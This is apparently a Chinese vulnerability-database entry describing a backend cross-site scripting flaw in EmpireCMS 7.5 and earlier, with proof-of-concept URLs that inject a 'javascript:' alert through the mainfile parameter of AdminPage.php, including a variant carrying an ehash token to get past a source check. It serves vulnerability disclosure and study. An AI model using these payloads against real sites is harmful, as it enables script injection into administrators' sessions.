---
title: 'EmpireCMS V7.5后台xss漏洞'
date: Wed, 09 Sep 2020 14:03:12 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EmpireCMS <=7.5

### 漏洞POC

需要有后台权限

```
http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)
```

若提示非法来源加入参数hash参数，例：ehash\_gxCQz=zERR2KY6NAMicC0c5OYv,如下 ![](EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/15996652611.png)

```
http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&ehash_gxCQz=zERR2KY6NAMicC50Yv
```